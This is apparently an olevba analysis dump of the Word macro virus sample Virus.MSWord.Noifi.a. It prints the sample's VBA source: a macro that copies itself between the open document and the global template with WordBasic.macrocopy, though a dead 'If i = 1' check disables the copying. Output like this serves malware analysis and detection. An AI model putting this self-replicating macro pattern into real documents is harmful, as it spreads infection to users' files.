olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Noifi.a-c99707e8602aec338a2cd74e47d63e4acf592142
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Noifi.a-c99707e8602aec338a2cd74e47d63e4acf592142 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Noifi.a-c99707e8602aec338a2cd74e47d63e4acf592142 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub asdf()
Attribute asdf.VB_Description = "Macro created 08/06/97 by XXXXXXXXXX"
Attribute asdf.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.asdf"
'
' asdf Macro
' Macro created 08/06/97 by XXXXXXXXXX
' Dumb Bloodhound infector, repairable

    i = 0
    If i = 1 Then
        WordBasic.macrocopy "NewMacros", WordBasic.FileName$() + ":" + "NewMacros"
        WordBasic.macrocopy WordBasic.FileName$() + ":" + "NewMacros", "NewMacros"
    End If
End Sub
No suspicious keyword or IOC found.

